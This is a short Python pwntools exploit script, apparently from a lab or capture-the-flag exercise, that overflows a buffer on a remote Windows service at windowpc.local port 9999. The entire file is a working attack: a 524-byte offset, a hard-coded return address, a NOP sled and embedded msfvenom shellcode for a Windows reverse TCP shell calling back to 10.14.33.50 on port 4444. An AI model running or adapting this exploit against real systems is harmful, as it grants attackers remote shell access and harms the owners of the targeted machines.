from pwn import *
import warnings

warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

io = remote('windowpc.local', 9999)

offset = 524
# shellcode: msfvenom -p windows/shell_reverse_tcp LHOST=10.14.33.50 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
shellcode = (
"\xb8\x5b\x84\x9e\x3a\xdd\xc4\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xc3\x04\x31\x43\x0e\x03\x18\x8a\x7c\xcf\x62\x7a\x02"
"\x30\x9a\x7b\x63\xb8\x7f\x4a\xa3\xde\xf4\xfd\x13\x94\x58\xf2"
"\xd8\xf8\x48\x81\xad\xd4\x7f\x22\x1b\x03\x4e\xb3\x30\x77\xd1"
"\x37\x4b\xa4\x31\x09\x84\xb9\x30\x4e\xf9\x30\x60\x07\x75\xe6"
"\x94\x2c\xc3\x3b\x1f\x7e\xc5\x3b\xfc\x37\xe4\x6a\x53\x43\xbf"
"\xac\x52\x80\xcb\xe4\x4c\xc5\xf6\xbf\xe7\x3d\x8c\x41\x21\x0c"
"\x6d\xed\x0c\xa0\x9c\xef\x49\x07\x7f\x9a\xa3\x7b\x02\x9d\x70"
"\x01\xd8\x28\x62\xa1\xab\x8b\x4e\x53\x7f\x4d\x05\x5f\x34\x19"
"\x41\x7c\xcb\xce\xfa\x78\x40\xf1\x2c\x09\x12\xd6\xe8\x51\xc0"
"\x77\xa9\x3f\xa7\x88\xa9\x9f\x18\x2d\xa2\x32\x4c\x5c\xe9\x5a"
"\xa1\x6d\x11\x9b\xad\xe6\x62\xa9\x72\x5d\xec\x81\xfb\x7b\xeb"
"\xe6\xd1\x3c\x63\x19\xda\x3c\xaa\xde\x8e\x6c\xc4\xf7\xae\xe6"
"\x14\xf7\x7a\xa8\x44\x57\xd5\x09\x34\x17\x85\xe1\x5e\x98\xfa"
"\x12\x61\x72\x93\xb9\x98\x15\x96\x33\x83\xd7\xce\x49\xc3\x06"
"\x53\xc7\x25\x42\x7b\x81\xfe\xfb\xe2\x88\x74\x9d\xeb\x06\xf1"
"\x9d\x60\xa5\x06\x53\x81\xc0\x14\x04\x61\x9f\x46\x83\x7e\x35"
"\xee\x4f\xec\xd2\xee\x06\x0d\x4d\xb9\x4f\xe3\x84\x2f\x62\x5a"
"\x3f\x4d\x7f\x3a\x78\xd5\xa4\xff\x87\xd4\x29\xbb\xa3\xc6\xf7"
"\x44\xe8\xb2\xa7\x12\xa6\x6c\x0e\xcd\x08\xc6\xd8\xa2\xc2\x8e"
"\x9d\x88\xd4\xc8\xa1\xc4\xa2\x34\x13\xb1\xf2\x4b\x9c\x55\xf3"
"\x34\xc0\xc5\xfc\xef\x40\xe5\x1e\x25\xbd\x8e\x86\xac\x7c\xd3"
"\x38\x1b\x42\xea\xba\xa9\x3b\x09\xa2\xd8\x3e\x55\x64\x31\x33"
"\xc6\x01\x35\xe0\xe7\x03")

payload = "\x90" * 524 + "\xf3\x12\x17\x31" + "\x90" * 10 + shellcode

io.sendline(payload)
